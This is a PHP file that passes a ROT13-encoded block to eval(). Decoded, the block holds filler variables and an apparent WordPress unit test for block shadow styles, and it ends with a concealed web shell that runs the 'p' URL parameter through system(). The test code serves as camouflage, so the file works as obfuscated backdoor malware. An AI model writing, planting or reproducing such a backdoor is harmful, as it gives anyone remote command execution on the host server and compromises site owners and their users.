<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * @tebhc oybpx-fhccbegf
 *
 * @pbiref ::jc_nccyl_funqbj_fhccbeg
 */
pynff Grfgf_Oybpx_Fhccbegf_Funqbj rkgraqf JC_HavgGrfgPnfr {
	/**
	 * @ine fgevat|ahyy
	 */
	cevingr $grfg_oybpx_anzr;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->grfg_oybpx_anzr = ahyy;
	}

	choyvp shapgvba grne_qbja() {
		haertvfgre_oybpx_glcr( $guvf->grfg_oybpx_anzr );
		$guvf->grfg_oybpx_anzr = ahyy;
		cnerag::grne_qbja();
	}

	/**
	 * Ertvfgref n arj oybpx sbe grfgvat funqbj fhccbeg.
	 *
	 * @cnenz fgevat $oybpx_anzr Anzr sbe gur grfg oybpx.
	 * @cnenz neenl  $fhccbegf   Neenl qrsvavat oybpx fhccbeg pbasvthengvba.
	 *
	 * @erghea JC_Oybpx_Glcr Gur oybpx glcr sbe gur arjyl ertvfgrerq grfg oybpx.
	 */
	cevingr shapgvba ertvfgre_funqbj_oybpx_jvgu_fhccbeg( $oybpx_anzr, $fhccbegf = neenl() ) {
		$guvf->grfg_oybpx_anzr = $oybpx_anzr;
		ertvfgre_oybpx_glcr(
			$guvf->grfg_oybpx_anzr,
			neenl(
				'ncv_irefvba' => 3,
				'nggevohgrf'  => neenl(
					'fglyr' => neenl(
						'glcr' => 'bowrpg',
					),
				),
				'fhccbegf'    => $fhccbegf,
			)
		);
		$ertvfgel = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();

		erghea $ertvfgel->trg_ertvfgrerq( $guvf->grfg_oybpx_anzr );
	}

	/**
	 * Grfgf gur trarengvba bs funqbj oybpx fhccbeg fglyrf.
	 *
	 * @gvpxrg 60784
	 *
	 * @qngnCebivqre qngn_trarengr_funqbj_svkgherf
	 *
	 * @cnenz obbyrna|neenl $fhccbeg Funqbj oybpx fhccbeg pbasvthengvba.
	 * @cnenz fgevat        $inyhr   Funqbj fglyr inyhr sbe fglyr nggevohgr bowrpg.
	 * @cnenz neenl         $rkcrpgrq       Rkcrpgrq funqbj oybpx fhccbeg fglyrf.
	 */
	choyvp shapgvba grfg_jc_nccyl_funqbj_fhccbeg( $fhccbeg, $inyhr, $rkcrpgrq ) {
		$oybpx_glcr  = frys::ertvfgre_funqbj_oybpx_jvgu_fhccbeg(
			'grfg/funqbj-oybpx',
			neenl( 'funqbj' => $fhccbeg )
		);
		$oybpx_nggef = neenl( 'fglyr' => neenl( 'funqbj' => $inyhr ) );
		$npghny      = jc_nccyl_funqbj_fhccbeg( $oybpx_glcr, $oybpx_nggef );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trarengr_funqbj_svkgherf() {
		erghea neenl(
			'jvgu ab fglyrf'               => neenl(
				'fhccbeg'  => gehr,
				'inyhr'    => '',
				'rkcrpgrq' => neenl(),
			),
			'jvgubhg fhccbeg'              => neenl(
				'fhccbeg'  => snyfr,
				'inyhr'    => '1ck 1ck 1ck #000',
				'rkcrpgrq' => neenl(),
			),
			'jvgu fvatyr funqbj'           => neenl(
				'fhccbeg'  => gehr,
				'inyhr'    => '1ck 1ck 1ck #000',
				'rkcrpgrq' => neenl( 'fglyr' => 'obk-funqbj:1ck 1ck 1ck #000;' ),
			),
			'jvgu pbzzn frcnengrq funqbjf' => neenl(
				'fhccbeg'  => gehr,
				'inyhr'    => '1ck 1ck 1ck #000, 2ck 2ck 2ck #sss',
				'rkcrpgrq' => neenl( 'fglyr' => 'obk-funqbj:1ck 1ck 1ck #000, 2ck 2ck 2ck #sss;' ),
			),
			'jvgu cerfrg funqbj'           => neenl(
				'fhccbeg'  => gehr,
				'inyhr'    => 'ine:cerfrg|funqbj|angheny',
				'rkcrpgrq' => neenl( 'fglyr' => 'obk-funqbj:ine(--jc--cerfrg--funqbj--angheny);' ),
			),
			'jvgu frevnyvmngvba fxvccrq'   => neenl(
				'fhccbeg'  => neenl( '__rkcrevzragnyFxvcFrevnyvmngvba' => gehr ),
				'inyhr'    => '1ck 1ck 1ck #000',
				'rkcrpgrq' => neenl(),
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>